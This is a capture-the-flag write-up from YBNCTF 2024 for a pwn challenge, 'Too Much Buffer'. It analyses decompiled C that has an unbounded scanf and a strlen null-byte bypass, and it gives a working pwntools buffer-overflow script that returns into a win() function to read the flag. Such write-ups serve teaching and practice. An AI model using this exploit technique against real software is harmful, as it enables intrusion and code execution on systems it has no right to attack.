---
title: Too Much Buffer
date: 2024-11-27
tags: 
- pwn
- author-fs
- Buffer Overflow
categories: YBNCTF 2024
---

by {% person fs %}

This challenge revolves a vulnerability around strlen() C and involves a buffer overflow.

```c

undefined8 main(void)

{
  int iVar1;
  undefined8 uStack_90;
  char input [104];
  size_t len;
  char *local_18;
  ulong count;
  
  uStack_90 = 0x40126f;
  ignore_me_innit_buffering();
  uStack_90 = 0x401279;
  puts(err);
  uStack_90 = 0x401283;
  puts("I eat bits with mushrooms, bits with muffins, and even bits with bits!");
  uStack_90 = 0x401299;
  scanf(%s,input);//vulnerable to buffer overflow since %s doesnt put any length restriction on input. use %[size]s to be more secure
  uStack_90 = 0x4012a5;
  len = strlen(input);//vulnerable as strlen() only counts up to null-byte
  for (count = 0; count < len; count = count + 1) {
    uStack_90 = 0x4012cb;
    iVar1 = valid_characters((int)input[count]);//checks if input has 'yesbutnoYESBUTNO'
    if (iVar1 == -1) goto LAB_00401324;
  }
  if (len < 100) {//checking if length of input exceeds 100
    local_18 = input;
    if (4 < len) {
      local_18 = input + (len - 4);
    }
    uStack_90 = 0x40131e;
    printf("Most yummy part(also the last part): %s\n",local_18);
    return 0;
  }
LAB_00401324:
  uStack_90 = 0x40132e;
  puts("ewwwwwwwwwwwwwwwwwww what\'d you put in that????");
                    /* WARNING: Subroutine does not return */
  uStack_90 = 0x401338;
  exit(0);
}

```

We also see there's a win() function that cats out flag on remote server. Given that strlen() only counts up to null byte and scanf() is vulnerable to buffer overflow and we need to contain the string 'yesbutnoYESBUTNO' inside our input, we can construct our payload as such. Payload example: (b'yesbutnoYESBUTNO'+b'\x00\x00\x00\x00')\*5 (this just gets our payload to 100 length)+b'A'*padding to rbp+b"A"\*8 (overwrite rbp) + ret gadget (stack alignment issue)+address of win()(get rip register to point to win() function address),

Hence, we can write our payload as such,

```py
from pwn import *

p=process("./buffer_monster")
#p=remote("tcp.ybn.sg", "28433")
elf=ELF("./buffer_monster")
#gdb.attach(p)

cyclic_payload=cyclic_find("haaaiaaa")#offset to rbp register
print(cyclic_payload)
payload=b"yesbutnoYESBUTNO\x00\x00\x00\x00"*5+cyclic(cyclic_payload)+b"A"*8+p64(0x0000000000401016)+p64(elf.sym['win'])
p.sendline(payload)
p.interactive()
```

We get flag.txt running this.

Make more stack pwn in finals please.
